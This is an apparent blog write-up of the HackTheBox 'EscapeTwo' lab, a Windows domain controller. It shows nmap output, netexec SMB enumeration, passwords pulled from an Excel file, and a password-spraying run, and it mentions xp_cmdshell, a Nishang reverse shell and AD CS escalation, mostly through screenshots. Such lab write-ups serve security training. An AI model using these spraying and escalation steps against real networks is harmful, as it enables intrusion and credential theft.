---
layout: post
title: "Hackthebox - EscapeTwo"
# date: 2025-05-19 10:00:00 +0700
categories: [hackthebox]
tags: [ctf, windows, hackthebox, adcs, certipy, netexec, bloodhound, netexec, mssql]
image: /assets/images/EscapeTwo/EscapeTwo.jpg
---

# EscapeTwo

## Enumeration

### Scanning Open Port

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-19 20:08 WIB
Nmap scan report for 10.10.11.51
Host is up (0.022s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-19 12:48:14Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-18T19:18:58
|_Not valid after:  2026-05-18T19:18:58
|_ssl-date: 2025-05-19T12:49:40+00:00; -20m49s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-19T12:49:40+00:00; -20m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-18T19:18:58
|_Not valid after:  2026-05-18T19:18:58
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-05-18T11:29:55
|_Not valid after:  2055-05-18T11:29:55
|_ssl-date: 2025-05-19T12:49:40+00:00; -20m49s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-05-19T12:49:40+00:00; -20m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-18T19:18:58
|_Not valid after:  2026-05-18T19:18:58
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-19T12:49:40+00:00; -20m49s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2025-05-18T19:18:58
|_Not valid after:  2026-05-18T19:18:58
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -20m49s, deviation: 0s, median: -20m49s
| smb2-time:
|   date: 2025-05-19T12:49:01
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.27 seconds
```

## SMB Enumeration

Enumeration of shares revealed that the Accounting Department share can be accessed with the "rose" user credentials provided by the HackTheBox machine.

```bash
[May 19, 2025 - 20:14:10 (WIB)] exegol-htb EscapeTwo # nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ
```

## Downloading Accounting Department Files

I used the spider_plus module in Netexec with the option `-o DOWNLOAD_FLAG=true`

```bash
[May 19, 2025 - 20:16:28 (WIB)] exegol-htb EscapeTwo # nxc smb 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su' -M spider_plus -o DOWNLOAD_FLAG=true
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.10.11.51     445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.51     445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.51     445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SPIDER_PLUS 10.10.11.51     445    DC01             [-] Failed to download file "Default/NTUSER.DAT.LOG2". Error: 'RemoteFile' object has no attribute 'get_filesize'
SPIDER_PLUS 10.10.11.51     445    DC01             [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.10.11.51.json".
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Shares:           7 (Accounting Department, ADMIN$, C$, IPC$, NETLOGON, SYSVOL, Users)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Readable Shares:  5 (Accounting Department, IPC$, NETLOGON, SYSVOL, Users)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Total folders found:  76
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Total files found:    67
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Files filtered:       43
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size average:    23.74 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size min:        0 B
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size max:        512 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File unique exts:     15 (lnk, desklink, mapimail, ini, dat, zfsendtotarget, log1, regtrans-ms, log2, blf...)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Downloads successful: 23
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Downloads failed:     1
```

I obtained two Excel files: `accounting_2024.xlsx` and `accounts.xlsx`. I will analyze these files to search for potential passwords.

![image.png](assets/images/EscapeTwo/image.png)

These two files are ZIP files that we need to extract to access their contents.

![image.png](assets/images/EscapeTwo/image%201.png)

After finding usernames and passwords in the `accounts.xlsx` file, I'll create two separate files: users.txt for usernames and passwords.txt for passwords. Then I'll attempt password spraying to try gaining access with these new credentials.

```xml
[May 19, 2025 - 20:29:01 (WIB)] exegol-htb xl # pwd
/workspace/EscapeTwo/shares/10.10.11.51/Accounting Department/accounts/xl

[May 19, 2025 - 20:29:02 (WIB)] exegol-htb xl # cat sharedStrings.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24">
    <si><t xml:space="preserve">First Name</t></si>
    <si><t xml:space="preserve">Last Name</t></si>
    <si><t xml:space="preserve">Email</t></si>
    <si><t xml:space="preserve">Username</t></si>
    <si><t xml:space="preserve">Password</t></si>
    <si><t xml:space="preserve">Angela</t></si>
    <si><t xml:space="preserve">Martin</t></si>
    <si><t xml:space="preserve">angela@sequel.htb</t></si>
    <si><t xml:space="preserve">angela</t></si>
    <si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si>
    <si><t xml:space="preserve">Oscar</t></si>
    <si><t xml:space="preserve">Martinez</t></si>
    <si><t xml:space="preserve">oscar@sequel.htb</t></si>
    <si><t xml:space="preserve">oscar</t></si>
    <si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si>
    <si><t xml:space="preserve">Kevin</t></si>
    <si><t xml:space="preserve">Malone</t></si>
    <si><t xml:space="preserve">kevin@sequel.htb</t></si>
    <si><t xml:space="preserve">kevin</t></si>
    <si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si>
    <si><t xml:space="preserve">NULL</t></si>
    <si><t xml:space="preserve">sa@sequel.htb</t></si>
    <si><t xml:space="preserve">sa</t></si>
    <si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si>
</sst>

Users:
angela
oscar
kevin
sa

Password:
0fwz7Q4mSpurIt99
86LxLBMgEWaKUnBG
Md9Wlq1E5bZnVDVo
MSSQLP@ssw0rd!
```


## Initial Foothold

Using password spraying, I successfully found valid credentials for the user 'oscar' with the password '86LxLBMgEWaKUnBG'. I will now attempt to enumerate further using these credentials to discover additional attack vectors.
```bash
[May 19, 2025 - 20:35:54 (WIB)] exegol-htb EscapeTwo # nxc smb 10.10.11.51 -u users.txt -p passwords.txt
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE
SMB         10.10.11.51     445    DC01             [-] sequel.htb\kevin:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE
SMB         10.10.11.51     445    DC01             [-] sequel.htb\sa:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE
SMB         10.10.11.51     445    DC01             [-] sequel.htb\angela:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG
```

I want to use the `--users` option in LDAP to check if there are other accounts

![image.png](assets/images/EscapeTwo/image%202.png)

So final user will be:

```bash
User:
Administrator
Guest
krbtgt
michael
ryan
oscar
sql_svc
rose
ca_svc
angela
kevin
sa

Password:
0fwz7Q4mSpurIt99
86LxLBMgEWaKUnBG
Md9Wlq1E5bZnVDVo
MSSQLP@ssw0rd!
```
![image.png](assets/images/EscapeTwo/image%203.png)

I got mssql admin!, let's execute commands with xp_cmdshell
![image.png](assets/images/EscapeTwo/image%204.png)
![image.png](assets/images/EscapeTwo/image%205.png)

Using Nishang’s `Invoke-ReverseShellTcp.ps1`, we established a reverse shell to the target:
![image.png](assets/images/EscapeTwo/image%206.png)

![image.png](assets/images/EscapeTwo/image%207.png)

We obtained sql_svc credentials

![image.png](assets/images/EscapeTwo/image%208.png)

With the discovered credentials, we attempted password spraying across services to test for credential reuse.
![image.png](assets/images/EscapeTwo/image%209.png)

First flag 😋😋

![image.png](assets/images/EscapeTwo/image%2010.png)

## BloodHound Investigate

![image.png](assets/images/EscapeTwo/image%2011.png)

I'm running BloodHound to investigate potential attacks and map the Active Directory infrastructure for easier analysis.

![image.png](assets/images/EscapeTwo/image%2012.png)

We have WriteOwner to CA_SVC users, we can change ca_svc owner to ryan and add genericAll to ca_svc then we can attack with targetedKerberoast.py, Shadow Credential, Reset Password

![image.png](assets/images/EscapeTwo/image%2013.png)

Error Clock skew too great we can use faketime to sync time with Domain Controller:

```bash
faketime "$(rdate -n 10.10.11.70 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh`
```

![image.png](assets/images/EscapeTwo/image%2014.png)
![image.png](assets/images/EscapeTwo/image%2015.png)

## AD-CS Privilege Escalation

CA_SVC is member of CERT PUBLISHERS!
![image.png](assets/images/EscapeTwo/image%2016.png)

[https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)

First we need information from Certify.exe: `./Certify.exe find /domain:sequel.htb`

![image.png](assets/images/EscapeTwo/image%2018.png)

Now time to exploit AD-CS
![image.png](assets/images/EscapeTwo/image%2019.png)
![image.png](assets/images/EscapeTwo/image%2020.png)
![image.png](assets/images/EscapeTwo/image%2021.png)

Clock skew too great again… 😤😤😤

## Pwned
![image.png](assets/images/EscapeTwo/image%2022.png)
![image.png](assets/images/EscapeTwo/image%2023.png)
